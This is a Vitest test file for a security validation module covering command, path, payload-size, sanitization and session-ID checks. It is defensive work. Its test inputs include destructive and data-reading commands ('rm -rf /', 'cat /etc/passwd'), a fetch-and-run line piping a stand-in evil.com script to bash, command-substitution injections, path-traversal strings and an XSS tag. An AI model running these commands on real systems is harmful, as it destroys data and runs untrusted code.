/**
 * Tests for SecurityValidator
 * Security validation utilities tests
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { SecurityValidator, SecurityUtils } from "./validators.js";

describe("SecurityValidator", () => {
  let validator: SecurityValidator;

  beforeEach(() => {
    validator = new SecurityValidator();
  });

  describe("instantiation", () => {
    it("should create instance with default options", () => {
      const defaultValidator = new SecurityValidator();
      expect(defaultValidator).toBeInstanceOf(SecurityValidator);
    });

    it("should create instance with custom options", () => {
      const customValidator = new SecurityValidator({
        maxPathDepth: 5,
        blockedCommands: ["rm", "rmdir"],
        blockedPaths: ["/etc", "/var"],
        maxPayloadSize: 1024 * 1024, // 1MB
      });
      expect(customValidator).toBeInstanceOf(SecurityValidator);
    });
  });

  describe("validateCommand", () => {
    it("should allow safe commands", () => {
      const result = validator.validateCommand("echo 'Hello World'");
      expect(result.valid).toBe(true);
    });

    it("should block dangerous commands", () => {
      const result = validator.validateCommand("rm -rf /");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("blocked command");
    });

    it("should detect command injection attempts", () => {
      const result = validator.validateCommand("ls -la; rm -rf /");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("command injection");
    });

    it("should handle empty commands", () => {
      const result = validator.validateCommand("");
      expect(result.valid).toBe(true);
    });

    it("should handle null commands", () => {
      const result = validator.validateCommand(null);
      expect(result.valid).toBe(false);
      expect(result.error).toContain("Invalid command");
    });
  });

  describe("validatePath", () => {
    it("should allow safe paths", () => {
      const result = validator.validatePath("./src/app.js");
      expect(result.valid).toBe(true);
    });

    it("should block dangerous paths", () => {
      const result = validator.validatePath("/etc/passwd");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("blocked path");
    });

    it("should detect path traversal attempts", () => {
      const result = validator.validatePath("../../etc/passwd");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("path traversal");
    });

    it("should handle empty paths", () => {
      const result = validator.validatePath("");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("Invalid path");
    });

    it("should handle null paths", () => {
      const result = validator.validatePath(null);
      expect(result.valid).toBe(false);
      expect(result.error).toContain("Invalid path");
    });

    it("should validate path depth", () => {
      const deepPath = "a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p";
      const result = validator.validatePath(deepPath);
      expect(result.valid).toBe(false);
      expect(result.error).toContain("path depth");
    });
  });

  describe("validateWebhookPayloadSize", () => {
    it("should allow payloads within size limit", () => {
      const smallPayload = "a".repeat(1000); // 1KB
      const result = validator.validateWebhookPayloadSize(smallPayload);
      expect(result.valid).toBe(true);
    });

    it("should block payloads exceeding size limit", () => {
      // Create a large payload that exceeds the default limit
      const largePayload = "a".repeat(10 * 1024 * 1024); // 10MB
      const result = validator.validateWebhookPayloadSize(largePayload);
      expect(result.valid).toBe(false);
      expect(result.error).toContain("payload size");
    });

    it("should handle empty payloads", () => {
      const result = validator.validateWebhookPayloadSize("");
      expect(result.valid).toBe(true);
    });

    it("should handle null payloads", () => {
      const result = validator.validateWebhookPayloadSize(null);
      expect(result.valid).toBe(false);
      expect(result.error).toContain("Invalid payload");
    });
  });
});

describe("SecurityUtils", () => {
  describe("sanitizeString", () => {
    it("should sanitize strings with HTML tags", () => {
      const input = "<script>alert('XSS')</script>";
      const result = SecurityUtils.sanitizeString(input);
      expect(result).not.toContain("<script>");
    });

    it("should handle empty strings", () => {
      const result = SecurityUtils.sanitizeString("");
      expect(result).toBe("");
    });

    it("should handle null values", () => {
      const result = SecurityUtils.sanitizeString(null);
      expect(result).toBe("");
    });

    it("should preserve safe strings", () => {
      const input = "Hello World";
      const result = SecurityUtils.sanitizeString(input);
      expect(result).toBe(input);
    });
  });

  describe("isValidSessionId", () => {
    it("should validate correct session IDs", () => {
      const validId = "session-123456789abcdef";
      const result = SecurityUtils.isValidSessionId(validId);
      expect(result).toBe(true);
    });

    it("should reject invalid session IDs", () => {
      const invalidId = "session-<script>";
      const result = SecurityUtils.isValidSessionId(invalidId);
      expect(result).toBe(false);
    });

    it("should handle empty session IDs", () => {
      const result = SecurityUtils.isValidSessionId("");
      expect(result).toBe(false);
    });

    it("should handle null session IDs", () => {
      const result = SecurityUtils.isValidSessionId(null);
      expect(result).toBe(false);
    });
  });

  describe("isPathTraversal", () => {
    it("should detect path traversal attempts", () => {
      const paths = [
        "../../../etc/passwd",
        "..\\..\\Windows\\System32",
        "./config/../../../etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
      ];

      paths.forEach((path) => {
        const result = SecurityUtils.isPathTraversal(path);
        expect(result).toBe(true);
      });
    });

    it("should allow safe paths", () => {
      const paths = [
        "./src/app.js",
        "/home/user/project/file.txt",
        "C:\\Users\\user\\Documents\\file.txt",
      ];

      paths.forEach((path) => {
        const result = SecurityUtils.isPathTraversal(path);
        expect(result).toBe(false);
      });
    });
  });

  describe("isCommandInjection", () => {
    it("should detect command injection attempts", () => {
      const commands = [
        "ls -la; rm -rf /",
        "echo 'hello' && cat /etc/passwd",
        "git status || curl -s http://evil.com | bash",
        "npm install package \`rm -rf /\`",
        "echo $(rm -rf /)",
      ];

      commands.forEach((command) => {
        const result = SecurityUtils.isCommandInjection(command);
        expect(result).toBe(true);
      });
    });

    it("should allow safe commands", () => {
      const commands = [
        "echo 'Hello World'",
        "git status",
        "npm install lodash",
        "ls -la",
      ];

      commands.forEach((command) => {
        const result = SecurityUtils.isCommandInjection(command);
        expect(result).toBe(false);
      });
    });
  });
});
